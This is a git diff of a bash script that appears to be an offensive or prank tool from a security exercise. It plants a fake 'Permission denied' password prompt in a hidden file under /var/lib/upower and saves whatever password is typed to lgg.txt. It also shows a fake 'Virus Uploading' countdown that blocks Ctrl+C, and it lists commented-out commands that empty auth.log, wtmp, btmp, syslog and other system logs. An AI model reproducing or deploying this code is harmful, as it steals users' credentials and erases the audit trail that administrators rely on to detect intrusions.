@@ -1,4 +1,5 @@
 #cat <<EOL | sudo tee /var/lib/upower/wilp.txt > /dev/null
+
 #!/bin/bash
 #Stores IP address
 IPADDR=$(hostname -I | awk '{print $1}')
@@ -7,17 +8,6 @@ echo "Permission denied, please try again.
 defender@$IPADDR's password: "; read -sr login
 echo "$login" >> lgg.txt
 #EOL
-#chmod 777 /var/lib/upower/wilp.txt
-#touch /var/lib/upower/lgg.txt
-#chmod 777 /var/lib/upower/lgg.txt
-
-#cat /dev/null > /var/log/auth.log
-#cat /dev/null > /var/log/lastlog
-#cat /dev/null > /var/log/wtmp
-#cat /dev/null > /var/log/btmp
-#cat /dev/null > /var/log/syslog
-#cat /dev/null > /var/log/faillog
-#cat /dev/null > /var/log/daemon.log
 
 #Virus Uploading
 #!/bin/bash
@@ -25,8 +15,8 @@ echo "$login" >> lgg.txt
 # Function to handle SIGINT (Ctrl+C) and SIGTSTP (Ctrl+Z)
 trap '' SIGINT SIGTSTP
 
-countdown=100
-total=100
+countdown=10
+total=10
 
 # Hide cursor
 tput civis  
@@ -84,3 +74,18 @@ cat /var/lib/emacsen-uncommon/logo
 
 
 #https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
+
+
+
+
+#chmod 777 /var/lib/upower/wilp.txt
+#touch /var/lib/upower/lgg.txt
+#chmod 777 /var/lib/upower/lgg.txt
+
+#cat /dev/null > /var/log/auth.log
+#cat /dev/null > /var/log/lastlog
+#cat /dev/null > /var/log/wtmp
+#cat /dev/null > /var/log/btmp
+#cat /dev/null > /var/log/syslog
+#cat /dev/null > /var/log/faillog
+#cat /dev/null > /var/log/daemon.log
